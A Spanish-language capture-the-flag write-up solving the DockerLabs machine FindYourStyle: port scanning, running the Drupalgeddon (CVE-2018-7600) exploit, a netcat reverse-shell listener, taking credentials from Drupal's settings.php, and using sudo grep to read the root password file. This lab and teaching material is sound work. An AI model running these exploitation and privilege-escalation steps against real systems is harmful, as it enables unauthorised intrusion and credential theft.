## Introducción

Este documento presenta la resolución completa de la máquina **FindYourStyle**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web que ejecuta **Drupal 8.0**, una versión vulnerable a **Drupalgeddon (CVE-2018-7600)**. Este exploit permite ejecución remota de comandos, otorgando acceso inicial como `www-data`.
Una vez dentro, se encuentra el archivo `settings.php` de Drupal que contiene credenciales hardcodeadas del usuario `ballenita`. Tras acceder a esta cuenta, se identifica una configuración insegura de `sudo` que permite ejecutar `grep` como root, facilitando la lectura de archivos restringidos y la obtención de la contraseña de `root` para completar la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip FindYourStyle.zip
sudo bash auto_deploy.sh FindYourStyle.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p FindYourStyle/{content,exploits,nmap,scripts}
cd FindYourStyle
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762311219/Ports_nko7uj.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Al inspeccionar la página principal, se identifica que el sitio está implementado en **Drupal 8.0** (evidencia en el index y metadatos).

![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762311219/Index_uvkrjd.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Ejecución del exploit Drupalgeddon

Dado que el objetivo corre **Drupal 8.0**, se identifica el exploit conocido como **Drupalgeddon** (CVE-2018-7600) que permite ejecución remota de comandos.

Se localiza el exploit:

```bash
searchsploit drupal 8.0
searchsploit -m 44449
```

![Searchsploit](https://res.cloudinary.com/dewqswzke/image/upload/v1762311220/Searchploit_x1brun.png)

Se ejecuta el exploit contra la URL objetivo:

```bash
ruby 44449.rb http://172.17.0.2
```

![Drupalgeddon](https://res.cloudinary.com/dewqswzke/image/upload/v1762311219/Drupalgedon_hll3ru.png)

### 2.2 Reverse shell estable

La shell inicial es limitada, por lo que se despliega una reverse shell estable. Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se prepara y ejecuta el payload desde la shell obtenida para obtener una conexión interactiva:

![www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1762311221/www-data_qqaupc.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → ballenita

Se enumeran archivos del sistema y se encuentra el archivo `sites/default/settings.php` de Drupal que contiene credenciales hardcodeadas:

![User](https://res.cloudinary.com/dewqswzke/image/upload/v1762311220/User_naflym.png)

Con la credencial encontrada, se cambia al usuario `ballenita`:

```bash
su ballenita
```

### 3.2 De ballenita → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762311220/Sudo-l_zbrrcn.png)

El usuario puede ejecutar `grep` como root sin contraseña.

Se usa `grep` para leer archivos restringidos:

```bash
sudo /bin/grep -R '.*' /root/secretitomaximo.txt
```

![Elevate](https://res.cloudinary.com/dewqswzke/image/upload/v1762311219/Elevate_wecuwp.png)

Se obtiene la contraseña de `root` y se cambia al usuario:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762311219/Root_xxuhh2.png)
